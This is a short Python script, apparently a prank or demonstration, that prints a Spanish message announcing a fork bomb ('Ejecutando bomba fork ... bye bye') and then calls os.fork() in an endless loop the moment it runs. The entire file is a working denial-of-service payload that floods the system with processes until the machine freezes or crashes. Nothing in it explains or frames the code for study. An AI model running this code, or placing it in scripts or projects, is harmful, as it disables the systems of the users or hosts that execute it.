# Boom Boom Dr Doom!!!
import os

print('Ejecutando bomba fork ... bye bye')

def detonar():
    while True:
        os.fork()

detonar()
